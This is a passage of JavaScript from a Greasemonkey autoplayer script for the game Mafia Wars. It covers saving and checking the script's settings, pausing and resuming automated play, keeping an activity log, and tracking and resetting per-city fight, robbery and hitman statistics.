      alert('For the hitlistride XP please enter a number between 0 and 50 (default: 0).');
      return;
    } else {
      GM_setValue ('rideHitlistXP', rideHitlistXP);
    }
  }

  var stopPAHealth = parseInt(document.getElementById('stopPAHealth').value);
  if (stopPAHealth) {
    if (isNaN(stopPAHealth) || stopPAHealth < 0) {
      alert('Please enter a Power Attack Health level >= 0');
      return;
    } else {
      GM_setValue ('stopPAHealth', stopPAHealth);
    }
  }

  var stopBurstsHealth = parseInt(document.getElementById('stopBurstsHealth').value);
  if (stopBurstsHealth) {
    if (isNaN(stopBurstsHealth) || stopBurstsHealth < 0) {
      alert('Please enter a Bursts Attack Health level >= 0');
      return;
    } else {
      GM_setValue ('stopBurstsHealth', stopBurstsHealth);
    }
  }
  //Change autoheal shortcut if necessary
  if(!isGMChecked('autoHeal')) {
    document.getElementById('mwap_toggleheal').innerHTML=healOffIcon;
    document.getElementById('mwap_toggleheal').title = 'autoHeal unchecked';
    addToLog('healOffIcon Icon', 'autoHeal turned OFF by User');
  } else {
    if(GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB){
      document.getElementById('mwap_toggleheal').innerHTML=healOnHoldIcon;
      document.getElementById('mwap_toggleheal').title = 'autoHeal checked BUT OVERRULED - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
      addToLog('healOnHoldIcon Icon', 'autoHeal turned ON by User, but OVERRULED');
    } else {
      document.getElementById('mwap_toggleheal').innerHTML=healOnIcon;
      document.getElementById('mwap_toggleheal').title = 'autoHeal checked - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
      addToLog('healOnIcon Icon', 'autoHeal turned ON by User');
    }
  }

  //End Save Health Tab Settings

  //Start Save Cash Tab Settings
  //Cash Tab Checkboxes
  saveCheckBoxElementArray([
    'autoBuy','buildCar','buildWeapon','collectTakeNew York','collectTakeCuba','collectTakeMoscow','collectTakeBangkok','collectTakeLas Vegas',
    'autoBank','autoBankCuba','autoBankMoscow','autoBankBangkok','autoBankVegas'
  ]);
  //Cash Settings and Validation
  GM_setValue('minCashNew York', document.getElementById('minCashNew York').value);
  GM_setValue('minCashCuba', document.getElementById('minCashCuba').value);
  GM_setValue('minCashMoscow', document.getElementById('minCashMoscow').value);
  GM_setValue('minCashBangkok', document.getElementById('minCashBangkok').value);

  GM_setValue('buildCarId', document.getElementById('buildCarId').selectedIndex);
  GM_setValue('buildWeaponId', document.getElementById('buildWeaponId').selectedIndex);

  var autoBankOn      = (document.getElementById('autoBank').checked === true);
  var autoBankCubaOn  = (document.getElementById('autoBankCuba').checked === true);
  var autoBankMoscowOn  = (document.getElementById('autoBankMoscow').checked === true);
  var autoBankBangkokOn  = (document.getElementById('autoBankBangkok').checked === true);
  var autoBankVegasOn  = (document.getElementById('autoBankVegas').checked === true);
  var bankConfig      = document.getElementById('bankConfig').value;
  var bankConfigCuba      = document.getElementById('bankConfigCuba').value;
  var bankConfigMoscow      = document.getElementById('bankConfigMoscow').value;
  var bankConfigBangkok      = document.getElementById('bankConfigBangkok').value;
  var bankConfigVegas      = document.getElementById('bankConfigVegas').value;
  var bankConfigInt   = parseInt(bankConfig);
  var bankConfigCubaInt   = parseInt(bankConfigCuba);
  var bankConfigMoscowInt   = parseInt(bankConfigMoscow);
  var bankConfigBangkokInt   = parseInt(bankConfigBangkok);
  var bankConfigVegasInt   = parseInt(bankConfigVegas);

  GM_setValue('vaultHandling', document.getElementById('vaultHandling').selectedIndex);

  if (autoBankOn && (isNaN(bankConfigInt) || bankConfigInt < 10)) {
    alert('Minimum New York auto-bank amount must be 10 or higher.');
    return;
  }

  if (autoBankCubaOn && (isNaN(bankConfigCubaInt) || bankConfigCubaInt < 10)) {
    alert('Minimum Cuba auto-bank amount must be 10 or higher.');
    return;
  }

  if (autoBankMoscowOn && (isNaN(bankConfigMoscowInt) || bankConfigMoscowInt < 10)) {
    alert('Minimum Moscow auto-bank amount must be 10 or higher.');
    return;
  }

  if (autoBankBangkokOn && (isNaN(bankConfigBangkokInt) || bankConfigBangkokInt < 10)) {
    alert('Minimum Bangkok auto-bank amount must be 10 or higher.');
    return;
  }

  if (autoBankVegasOn && (isNaN(bankConfigVegasInt) || bankConfigVegasInt < 1)) {
    alert('Minimum Las Vegas auto-bank amount must be 1 or higher.');
    return;
  }

  GM_setValue('bankConfig', bankConfig);
  GM_setValue('bankConfigCuba', bankConfigCuba);
  GM_setValue('bankConfigMoscow', bankConfigMoscow);
  GM_setValue('bankConfigBangkok', bankConfigBangkok);
  GM_setValue('bankConfigVegas', bankConfigVegas);

  //End Save Cash Tab Settings

  //Start Save About Tab Settings
  //About Tab Checkboxes
  saveCheckBoxElementArray([
    'TestChanges'
  ]);
  //End Save About Tab Settings

  //Start Various Settings
  GM_setValue('propertyId', '12');

  // Clear the job state.
  setSavedList('jobsToDo', []);
  setSavedList('itemList', []);

  // Clear lists for mastered and available jobs.
  GM_setValue('masteredJobs', '({0:{},1:{},2:{},3:{},4:{}})');
  GM_setValue('availableJobs', '({0:{},1:{},2:{},3:{},4:{}})');

  // Clear the fight/hit state.
  fightListNew.set([]);
  skipStaminaSpend = false;

  // Invoke choose sides
  chooseSides();

  //End Various Settings

  //
  // All settings are valid. Save them.
  //

  toggleSettings();
  updateLogStats();
  refreshMWAPCSS();
  sendSettings();
}

function updateMastheadMenu() {
  var menuElt = document.getElementById('ap_menu');
  if (!menuElt) return;

  var elt = document.getElementById('pauseButton');
  if (running) {
    if (elt) return;
    destroyByID('resumeButton');
    destroyByID('ap_pause_img');
    // Show a pause button.
    elt = makeElement('span', null, {'id':'pauseButton'});
    elt.appendChild(document.createTextNode('Pause'));
    elt.addEventListener('click', pause, false);
    menuElt.insertBefore(elt, menuElt.firstChild);
  } else {
    // Remove the pause button.
    if (elt) {
      elt.parentNode.removeChild(elt);
    }

    // Show a resume button and paused image.
    elt = document.getElementById('resumeButton');
    if (elt) return;
    elt = makeElement('span', null, {'id':'resumeButton'});
    elt.appendChild(document.createTextNode('Resume'));
    menuElt.insertBefore(elt, menuElt.firstChild);
    elt.addEventListener('click', unPause, false);
    makeElement('div', menuElt.parentNode, {'id':'ap_pause_img', 'style':'background: transparent url(' + stripURI(pausedMessageImage) + ') no-repeat scroll 20px; position: absolute; top: 0; left: 0; bottom: 0; width: 250px'});
  }
}

function pause() {
  if (GM_getValue('isRunning') === false) {
    // Must have been paused already. Make sure the log is current.
    refreshLog();
  }

  // Update the running state.
  GM_setValue('isRunning', false);
  running = false;
  sendMWValues(['isRunning']);

  // Clear all timers.
  Autoplay.clearTimeout();
  Reload.clearTimeout();

  addToLog('pause Icon', 'Autoplayer is paused. Log & stats do not track manual activity.');
  mwapOnOffMenu();
  updateMastheadMenu();
}

function unPause() {
  if (GM_getValue('isRunning') === true) {
    // Must have been resumed already. Make sure the log is current.
    refreshLog();
  }

  // Clear lists for mastered and available jobs.
  GM_setValue('masteredJobs', '({0:{},1:{},2:{},3:{},4:{}})');
  GM_setValue('availableJobs', '({0:{},1:{},2:{},3:{},4:{}})');

  // Update the running state.
  GM_setValue('isRunning', true);
  running = true;
  sendMWValues(['isRunning']);

  addToLog('play Icon', 'Autoplayer resuming - <a href="http://www.playerscripts.com/" target="_blank">playerscripts.com</a>');
  mwapOnOffMenu();
  updateMastheadMenu();

  // Set up auto-reload.
  autoReload();

  // Kick off play.
  Autoplay.fx = goHome;
  Autoplay.delay = 150;
  Autoplay.start();
}

function mwapOnOffMenu() {
  var mafiaLogBox = document.getElementById('mafiaLogBox');
  var mwapElt = document.getElementById('ap_mwap_pause');
  if (!mafiaLogBox || !mwapElt) return;

  if (GM_getValue('isRunning') === false) {
    destroyByID('ap_mwap_pause');
    title = 'Click to resume PS MWAP';
    var mwapElt = makeElement('div', mafiaLogBox, {'class':'mouseunderline', 'title':title,'id':'ap_mwap_pause', 'style':'position: absolute; right: 60px; top: 0px; font-weight: 600; cursor: pointer; color: rgb(255, 217, 39);'});
    mwapElt.appendChild(document.createTextNode('resume'));
    mwapElt.addEventListener('click', mwapOnOff, false);
  } else {
    destroyByID('ap_mwap_pause');
    title = 'Click to pause PS MWAP';
    var mwapElt = makeElement('div', mafiaLogBox, {'class':'mouseunderline', 'title':title,'id':'ap_mwap_pause', 'style':'position: absolute; right: 60px; top: 0px; font-weight: 600; cursor: pointer; color: rgb(255, 217, 39);'});
    mwapElt.appendChild(document.createTextNode('pause'));
    mwapElt.addEventListener('click', mwapOnOff, false);
  }
}

function mwapOnOff() {
  if (GM_getValue('isRunning') === true) {
    pause();
  } else {
    unPause();
  }
}

function isFamily(username, how) {
  if(how == STAMINA_HOW_FIGHT_RANDOM ){
    var patterns = getSavedList('fightClanName');
    for (var i = 0, iLength=patterns.length; i < iLength; ++i) {
      var pattern = patterns[i];
      if (pattern && username.indexOf(pattern) != -1) {
        return true;
      }
    }
    return false;
  } else {
    var patterns = getSavedList('hitmanClanName');
    for (var i = 0, iLength=patterns.length; i < iLength; ++i) {
      var pattern = patterns[i];
      if (pattern && username.indexOf(pattern) != -1) {
        return true;
      }
    }
    return false;
  }

  return false;
}

// Can be enhanced by regular expressions but will "regular" folks get it?
function isLoggable(line) {
  // Do not filter logs if in DEBUG mode OR
  // if log filtering is disabled
  var filterOpt = parseInt(GM_getValue('filterOpt', 0));
  if (!line || debug || !isGMChecked('filterLog') || isNaN(filterOpt))
    return true;

  if (line.indexOf('Log filtering') != -1 || line.indexOf('"good">Patterns ') != -1) return true;

  var logPatterns = getSavedList(filterOpt == 0 ? 'filterPass' : 'filterFail');

  // Log if line ONLY contains any pattern from list
  for (var i = 0, iLength=logPatterns.length; i < iLength; ++i) {
    var pattern = logPatterns[i];
    if (pattern && line.indexOf(pattern) != -1) {
      return (filterOpt == 0);
    }
  }

  return (filterOpt == 1);
}

function addToLog(icon, line) {
  if (!debug && !isGMChecked('autoLog')) {
    // Logging is turned off.
    return;
  }

  // Do not log anything if log filter condition is met
  if (!isLoggable(line)) {
    return;
  }

  // Create a datestamp, formatted for the log.
  var currentTime = new Date();
  var m_names = new Array('Jan', 'Feb', 'Mar',
    'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep',
    'Oct', 'Nov', 'Dec');
  var timestampdate = m_names[currentTime.getMonth()] + ' ' + currentTime.getDate();

  // Create a timestamp, formatted for the log.
  var ampm, hours = currentTime.getHours();
  if (hours >= 12) {
    hours = hours - 12;
    ampm = ' PM';
  } else {
    ampm = ' AM';
  }
  if (hours == 0) {
    hours = 12;
  }
  var timestamptime = hours + ':' +
    (currentTime.getMinutes() < 10 ? 0 : '') +
    currentTime.getMinutes() + ':' +
    (currentTime.getSeconds() < 10 ? 0 : '') +
    currentTime.getSeconds() +
    ampm;

  // Get a log box to work with.
  var logBox = document.getElementById('logBox');
  if (!logBox) {
    if (!addToLog.logBox) {
      // There's no log box, so create one.
      addToLog.logBox = document.createElement('div');
      addToLog.logBox.innerHTML = GM_getValue('itemLog', '');
    }
    logBox = addToLog.logBox;
  }
  var logLen = logBox.childNodes.length;

  // Determine whether the new line repeats the most recent one.
  var repeatCount;
  if (logLen) {
    var elt = logBox.firstChild.childNodes[1];
    if (elt && elt.innerHTML.untag().indexOf(String(line).untag()) == 0) {
      if (elt.innerHTML.match(/\((\d+) times\)$/)) {
        repeatCount = parseInt(RegExp.$1) + 1;
      } else {
        repeatCount = 2;
      }
      line += ' (' + repeatCount + ' times)';
    }
  }

  // Create the new log entry.
  var lineToAdd = document.createElement('div');
  lineToAdd.className = 'logEvent ' + icon;
  lineToAdd.innerHTML = '<div class="eventTime">' + timestampdate + '<br/>' +
                        timestamptime + '</div><div class="eventBody">' +
                        line + '</div><div class="clear"></div>';

  // Put it in the log box.
  if (repeatCount) {
    logBox.replaceChild(lineToAdd, logBox.firstChild);
  } else {
    logBox.insertBefore(lineToAdd, logBox.firstChild);

    // If the log is too large, trim it down.
    var logMax = parseInt(GM_getValue('autoLogLength', 300));
    //GM_log('logLen=' + logLen + ', logMax=' + logMax);
    if (logMax > 0) {
      while (logLen-- > logMax) {
        logBox.removeChild(logBox.lastChild);
      }
    }
  }

  // Save the log.
  GM_setValue('itemLog', logBox.innerHTML);
}

function updateLogStats(newHow) {
  var fightCount = document.getElementById('fightCount');
  if (fightCount) {
    fightCount.firstChild.nodeValue = makeCommaValue(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0));
    document.getElementById('fightWinCount').firstChild.nodeValue = makeCommaValue(GM_getValue('fightWinCountInt', 0));
    var fightWinPct = (GM_getValue('fightWinCountInt', 0)/(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0)) * 100).toFixed(1);
      document.getElementById('fightWinPct').firstChild.nodeValue =  (isNaN(fightWinPct)) ? '0.0%' : fightWinPct + '%';
    document.getElementById('fightLossCount').firstChild.nodeValue = makeCommaValue(GM_getValue('fightLossCountInt', 0));
    var fightLossPct = (GM_getValue('fightLossCountInt', 0)/(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0)) * 100).toFixed(1)
      document.getElementById('fightLossPct').firstChild.nodeValue =  (isNaN(fightLossPct)) ? '0.0%' : fightLossPct + '%';
  }

  var passivefightCount = document.getElementById('passivefightCount');
  if (passivefightCount) {
    passivefightCount.firstChild.nodeValue = makeCommaValue(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0));
    document.getElementById('passivefightWinCount').firstChild.nodeValue = makeCommaValue(GM_getValue('passivefightWinCountInt', 0));
    var fightWinPct = (GM_getValue('passivefightWinCountInt', 0)/(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0)) * 100).toFixed(1);
    document.getElementById('passivefightWinPct').firstChild.nodeValue =  (isNaN(fightWinPct)) ? '0.0%' : fightWinPct + '%';
    document.getElementById('passivefightLossCount').firstChild.nodeValue = makeCommaValue(GM_getValue('passivefightLossCountInt', 0));
    var fightLossPct = (GM_getValue('passivefightLossCountInt', 0)/(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0)) * 100).toFixed(1)
    document.getElementById('passivefightLossPct').firstChild.nodeValue =  (isNaN(fightLossPct)) ? '0.0%' : fightLossPct + '%';
  }

  var passiveWinDollars = document.getElementById('totalPassiveWinDollars');
  if (passiveWinDollars) {
    var winDollars = parseInt(GM_getValue('passivefightWin$NY', 0)) + parseInt(GM_getValue('passivefightWin$Cuba', 0)) + parseInt(GM_getValue('passivefightWin$Moscow', 0)) + parseInt(GM_getValue('passivefightWin$Bangkok', 0)) + parseInt(GM_getValue('passivefightWin$Vegas', 0));
    var lossDollars = parseInt(GM_getValue('passivefightLoss$NY', 0)) + parseInt(GM_getValue('passivefightLoss$Cuba', 0)) + parseInt(GM_getValue('passivefightLoss$Moscow', 0)) + parseInt(GM_getValue('passivefightLoss$Bangkok', 0)) + parseInt(GM_getValue('passivefightLoss$Vegas', 0));
    var titlePassiveWinDollars = '$' + makeCommaValue(GM_getValue('passivefightWin$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('passivefightWin$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('passivefightWin$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('passivefightWin$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('passivefightWin$Vegas', 0));
    var titlePassiveLossDollars = '$' + makeCommaValue(GM_getValue('passivefightLoss$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('passivefightLoss$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('passivefightLoss$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('passivefightLoss$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('passivefightLoss$Vegas', 0));
    passiveWinDollars.firstChild.nodeValue = getDollarsUnit(winDollars);
    document.getElementById('totalPassiveLossDollars').firstChild.nodeValue = getDollarsUnit(lossDollars);
    document.getElementById('totalPassiveWinDollars').setAttribute('title', titlePassiveWinDollars);
    document.getElementById('totalPassiveLossDollars').setAttribute('title', titlePassiveLossDollars);
  }

  var whackedCount = document.getElementById('whackedCount');
  if (whackedCount) {
    document.getElementById('whackedCount').firstChild.nodeValue =  GM_getValue('whackedCount', 0);
  }

  var snuffCount = document.getElementById('snuffCount');
  if (snuffCount) {
    document.getElementById('snuffCount').firstChild.nodeValue =  GM_getValue('snuffCount', 0);
  }

  var passiveTotalExp = document.getElementById('passivetotalExp');
  if (passiveTotalExp) {
    passiveTotalExp.firstChild.nodeValue = makeCommaValue(GM_getValue('passivetotalFightExpInt', 0) + GM_getValue('passivetotalJobExpInt', 0));
    document.getElementById('passivetotalFightExp').firstChild.nodeValue = makeCommaValue(GM_getValue('passivetotalFightExpInt', 0));
    document.getElementById('passivetotalJobExp').firstChild.nodeValue = makeCommaValue(GM_getValue('passivetotalJobExpInt', 0));
  }

  var hitmanCount = document.getElementById('hitmanCount');
  if (hitmanCount) {
    document.getElementById('hitmanCount').firstChild.nodeValue = makeCommaValue(parseInt(GM_getValue('hitmanWinCountInt', 0)) + parseInt(GM_getValue('hitmanLossCountInt', 0)));
    document.getElementById('hitmanWinCount').firstChild.nodeValue = makeCommaValue(GM_getValue('hitmanWinCountInt', 0));
    var hitmanWinPct = (GM_getValue('hitmanWinCountInt', 0)/(GM_getValue('hitmanWinCountInt', 0) + GM_getValue('hitmanLossCountInt', 0)) * 100).toFixed(1);
      document.getElementById('hitmanWinPct').firstChild.nodeValue =  (isNaN(hitmanWinPct)) ? '0.0%' : hitmanWinPct + '%';
    document.getElementById('hitmanLossCount').firstChild.nodeValue = makeCommaValue(GM_getValue('hitmanLossCountInt', 0));
    var hitmanLossPct = (GM_getValue('hitmanLossCountInt', 0)/(GM_getValue('hitmanWinCountInt', 0) + GM_getValue('hitmanLossCountInt', 0)) * 100).toFixed(1);
      document.getElementById('hitmanLossPct').firstChild.nodeValue =  (isNaN(hitmanLossPct)) ? '0.0%' : hitmanLossPct + '%';
  }

  var robCount = document.getElementById('robCount');
  if (robCount) {
    document.getElementById('robCount').firstChild.nodeValue = makeCommaValue(parseInt(GM_getValue('robSuccessCountInt', 0)) + parseInt(GM_getValue('robFailedCountInt', 0)));
    document.getElementById('robWinCount').firstChild.nodeValue = makeCommaValue(GM_getValue('robSuccessCountInt', 0));
    var robWinPct = (GM_getValue('robSuccessCountInt', 0)/(GM_getValue('robSuccessCountInt', 0) + GM_getValue('robFailedCountInt', 0)) * 100).toFixed(1);
      document.getElementById('robWinPct').firstChild.nodeValue =  (isNaN(robWinPct)) ? '0.0%' : robWinPct + '%';
    document.getElementById('robLossCount').firstChild.nodeValue = makeCommaValue(GM_getValue('robFailedCountInt', 0));
    var robLossPct = (GM_getValue('robFailedCountInt', 0)/(GM_getValue('robSuccessCountInt', 0) + GM_getValue('robFailedCountInt', 0)) * 100).toFixed(1);
      document.getElementById('robLossPct').firstChild.nodeValue =  (isNaN(robLossPct)) ? '0.0%' : robLossPct + '%';
  }

  var totalWinDollars = document.getElementById('totalWinDollars');
  // if one is there, they all should be there
  if (totalWinDollars) {
    totalWinDollars.firstChild.nodeValue = getDollarsUnit(parseInt(GM_getValue('totalWinDollarsInt', 0)));
    document.getElementById('totalLossDollars').firstChild.nodeValue = getDollarsUnit(parseInt(GM_getValue('totalLossDollarsInt', 0)));
    var titleWinDollars = '$' + makeCommaValue(GM_getValue('fightWin$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('fightWin$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('fightWin$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('fightWin$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('fightWin$Vegas', 0));
    var titleLossDollars = '$' + makeCommaValue(GM_getValue('fightLoss$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('fightLoss$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('fightLoss$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('fightLoss$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('fightLoss$Vegas', 0));
    document.getElementById('totalWinDollars').setAttribute('title', titleWinDollars);
    document.getElementById('totalLossDollars').setAttribute('title', titleLossDollars);

    document.getElementById('totalExp').firstChild.nodeValue = makeCommaValue(GM_getValue('totalExpInt', 0));
    //FIXME: These values currently only get refreshed when stamina is spent,
    //       which isn't often enough. Perhaps other stats that only need to
    //       be refreshed after stamina is spent would be more useful anyway?
    //       And the xps to next level stat already appears in the main window.
    var rate = getStaminaGainRate();
    document.getElementById('expRate').firstChild.nodeValue = rate.toFixed(2);
    document.getElementById('expToNext').firstChild.nodeValue = makeCommaValue(ptsToNextLevel);
    document.getElementById('stamToNext').firstChild.nodeValue = rate? (ptsToNextLevel / rate).toFixed(0): 'n/a';
  }
}

function logFilterOnOff() {
  // Toggle logFilter flag
  filter = toggleCheckElt('filterLog');

  // Change filter color
  var filterElt = document.getElementById('ap_filter_log');
  if (filterElt) {
    filterElt.style.color = 'rgb(' + (filter ? '255' : '100') + ', 0, 0)';
  }

  // Log/Show Message
  var accept = GM_getValue('filterOpt') != 1;
  var patterns = getSavedList(accept ? 'filterPass' : 'filterFail');
  var msgLog = filter ? '<span class="good">Patterns ' + (accept ? 'accepted' : 'rejected') +
                        ': </span> ' + patterns.join(', ') : 'Log filtering disabled.';
  addToLog('info Icon', msgLog);
  if (GM_getValue('logOpen') != 'open') {
    alert(msgLog);
  }
}

function debugOnOff() {
  var debugElt = document.getElementById('ap_debug_log');
  var filterElt = document.getElementById('ap_filter_log');

  if (isGMChecked('enableDebug')) {
    addToLog('info Icon', '[code]Debug logging disabled.');
    GM_setValue('enableDebug', 0);
    debug = false;
    if (GM_getValue('logOpen') != 'open') {
      alert('Debug logging disabled.');
    } else {
      if (debugElt) debugElt.style.color = 'rgb(100, 0, 0)';
      if (filterElt) filterElt.style.display = 'block';
    }
  } else {
    GM_setValue('enableDebug', 'checked');
    debug = true;
    showMafiaLogBox();
    addToLog('info Icon', 'Debug logging enabled.[/code]');
    if (debugElt) debugElt.style.color = 'rgb(255, 0, 0)';
    if (filterElt) filterElt.style.display = 'none';

    debugDumpSettings();
  }
}

function DEBUG(line, level) {
  level = (level == null) ? 0 : level;
  if (debug) {
    addToLog('info Icon', line);
    GM_log(line, level);
  } else if (isGMChecked('enableDebug')) {
    // debug==false and 'enableDebug'==true: not main document, logBox not accessible, output to errorconsole/info:
    GM_log(line, level);
  }
}

function cyclePropertyList() {
  var i;
  DEBUG('cyclePropertyList(): '+ GM_getValue('propertyId', ''));
  if (GM_getValue('propertyId') <= 6) {
    cyclePropertyList();
    i = 12; //back to casinos
  } else {
    i = GM_getValue('propertyId') - 1;
  }
  GM_setValue('propertyId', i);
}

function refreshLog() {
  var logBox = document.getElementById('logBox');
  if (logBox) {
    logBox.innerHTML = GM_getValue('itemLog', '');
  }
}

function clearLog() {
  GM_setValue('itemLog', '');

  //for (var i = 0, iLength = cities.length; i < iLength; ++i)
  //  setGMTime('takeHour' + cities[i][CITY_NAME], '00:00');

  //reset the log box
  var logBox = document.getElementById('logBox');
    logBox.innerHTML = '';
}

function clearStats() {
  //reset log statistics
  GM_setValue('fightWinCountInt', 0);
  GM_setValue('fightLossCountInt', 0);

  GM_setValue('passivefightWinCountInt', 0);
  GM_setValue('passivefightLossCountInt', 0);
  GM_setValue('passivetotalJobExpInt', 0);
  GM_setValue('passivetotalFightExpInt', 0);
  GM_setValue('passivefightWin$NY', '0');
  GM_setValue('passivefightWin$Cuba', '0');
  GM_setValue('passivefightWin$Moscow', '0');
  GM_setValue('passivefightWin$Bangkok', '0');
  GM_setValue('passivefightWin$Vegas', '0');
  GM_setValue('passivefightLoss$NY', '0');
  GM_setValue('passivefightLoss$Cuba', '0');
  GM_setValue('passivefightLoss$Moscow', '0');
  GM_setValue('passivefightLoss$Bangkok', '0');
  GM_setValue('passivefightLoss$Vegas', '0');
  GM_setValue('snuffCount', 0);
  GM_setValue('whackedCount', 0);

  GM_setValue('robSuccessCountInt', 0);
  GM_setValue('robFailedCountInt', 0);
  GM_setValue('hitmanWinCountInt',0);
  GM_setValue('hitmanWinDollarsInt','0');
  GM_setValue('hitmanLossCountInt',0);
  GM_setValue('hitmanLossDollarsInt','0');

  GM_setValue('totalExpInt', 0);
  GM_setValue('totalRobStamInt', 0);
  GM_setValue('totalWinDollarsInt', '0');
  GM_setValue('totalLossDollarsInt', '0');

  GM_setValue('lastHitXp', 0);
  GM_setValue('totalHits', 0);
  GM_setValue('totalXp', 0);
  GM_setValue('currentHitXp', 0);
  GM_setValue('currentHitDollars','0');

  //ATK
  //New tracking stats for NY
  GM_setValue('fightExpNY', 0);          //Number of exper. points earned from fights in NY
  GM_setValue('fightWinsNY', 0);         //Count of fights won in NY
  GM_setValue('fightWin$NY', '0');       //$ won from fights in NY
  GM_setValue('fightLossesNY', 0);       //Count of fights lost in NY
  GM_setValue('fightLoss$NY', '0');      //$ lost from fights in NY
  GM_setValue('fightLossBGCHNY', 0);     //NY Bodyguard Critical Hit losses
  GM_setValue('fightLossBGCH$NY', '0');  //NY$ lost by Bodyguard Critical Hit
  GM_setValue('fightLossCHNY', 0);       //NY Critical Hit fight losses
  GM_setValue('fightLossCH$NY', '0');    //$ lost from Critical Hit in NY fights
  GM_setValue('fightLossStrongNY', 0);   //Too Strong loss type count from NY fights
  GM_setValue('fightLossStrong$NY', '0');//$ lost from Too Strong in NY fights
  //New tracking stats for Cuba
  GM_setValue('fightExpCuba', 0);        //Number of exper. points earned from fights in Cuba
  GM_setValue('fightWinsCuba', 0);       //Count of fights won in Cuba
  GM_setValue('fightWin$Cuba', '0');     //Cuban pesos won from fights
  GM_setValue('fightLossesCuba', 0);     //Count of fights lost in Cuba
  GM_setValue('fightLoss$Cuba', '0');    //Cuban pesos lost from fights
  GM_setValue('fightLossBGCHCuba', 0);   //Bodyguard Critical Hit loss type count from Cuba fights
  GM_setValue('fightLossBGCH$Cuba', '0');//$ lost from Bodyguard Critical Hit in Cuba fights
  GM_setValue('fightLossCHCuba', 0);     //Critical Hit loss type count from Cuba fights
  GM_setValue('fightLossCH$Cuba', '0');  //$ lost from Critical Hit in Cuba fights
  GM_setValue('fightLossStrongCuba', 0); //Too Strong loss type count from Cuba fights
  GM_setValue('fightLossStrong$Cuba', '0');//$ lost from Too Strong in Cuba fights
  //New tracking stats for Moscow
  GM_setValue('fightExpMoscow', 0);        //Number of exper. points earned from fights in Moscow
  GM_setValue('fightWinsMoscow', 0);       //Count of fights won in Moscow
  GM_setValue('fightWin$Moscow', '0');     //Moscown pesos won from fights
  GM_setValue('fightLossesMoscow', 0);     //Count of fights lost in Moscow
  GM_setValue('fightLoss$Moscow', '0');    //Moscown pesos lost from fights
  GM_setValue('fightLossBGCHMoscow', 0);   //Bodyguard Critical Hit loss type count from Moscow fights
  GM_setValue('fightLossBGCH$Moscow', '0');//$ lost from Bodyguard Critical Hit in Moscow fights
  GM_setValue('fightLossCHMoscow', 0);     //Critical Hit loss type count from Moscow fights
  GM_setValue('fightLossCH$Moscow', '0');  //$ lost from Critical Hit in Moscow fights
  GM_setValue('fightLossStrongMoscow', 0); //Too Strong loss type count from Moscow fights
  GM_setValue('fightLossStrong$Moscow', '0');//$ lost from Too Strong in Moscow fights
  //New tracking stats for Bangkok
  GM_setValue('fightExpBangkok', 0);        //Number of exper. points earned from fights in Bangkok
  GM_setValue('fightWinsBangkok', 0);       //Count of fights won in Bangkok
  GM_setValue('fightWin$Bangkok', '0');     //Bangkok pesos won from fights
  GM_setValue('fightLossesBangkok', 0);     //Count of fights lost in Bangkok
  GM_setValue('fightLoss$Bangkok', '0');    //Bangkok pesos lost from fights
  GM_setValue('fightLossBGCHBangkok', 0);   //Bodyguard Critical Hit loss type count from Bangkok fights
  GM_setValue('fightLossBGCH$Bangkok', '0');//$ lost from Bodyguard Critical Hit in Bangkok fights
  GM_setValue('fightLossCHBangkok', 0);     //Critical Hit loss type count from Bangkok fights
  GM_setValue('fightLossCH$Bangkok', '0');  //$ lost from Critical Hit in Bangkok fights
  GM_setValue('fightLossStrongBangkok', 0); //Too Strong loss type count from Bangkok fights
  GM_setValue('fightLossStrong$Bangkok', '0');//$ lost from Too Strong in Bangkok fights
  //New tracking stats for Las Vegas
  GM_setValue('fightExpVegas', 0);        //Number of exper. points earned from fights in Bangkok
  GM_setValue('fightWinsVegas', 0);       //Count of fights won in Vegas
  GM_setValue('fightWin$Vegas', '0');     //Vegas $ won from fights
  GM_setValue('fightLossesVegas', 0);     //Count of fights lost in Vegas
  GM_setValue('fightLoss$Vegas', '0');    //Vegas $ lost from fights
  GM_setValue('fightLossBGCHVegas', 0);   //Bodyguard Critical Hit loss type count from Vegas fights
  GM_setValue('fightLossBGCH$Vegas', '0');//$ lost from Bodyguard Critical Hit in Vegas fights
  GM_setValue('fightLossCHVegas', 0);     //Critical Hit loss type count from Vegas fights
  GM_setValue('fightLossCH$Vegas', '0');  //$ lost from Critical Hit in Vegas fights
  GM_setValue('fightLossStrongVegas', 0); //Too Strong loss type count from Vegas fights
  GM_setValue('fightLossStrong$Vegas', '0');//$ lost from Too Strong in Vegas fights
  updateLogStats();
}

function clearHitStats () {
  GM_setValue('lastHitXp', 0);
  GM_setValue('totalHits', 0);
  GM_setValue('totalXp', 0);
  GM_setValue('currentHitXp', 0);
}

function showPrimaryStats() {
  var passiveElt = document.getElementById('statPassive');
  var primaryElt = document.getElementById('statPrimary');
  var primaryBtnElt = document.getElementById('btnPrimaryStat');
  var passiveBtnElt = document.getElementById('btnPassiveStat');
  if (passiveElt && primaryElt) {
    passiveElt.style.display = 'none';
    primaryElt.style.display = 'block';
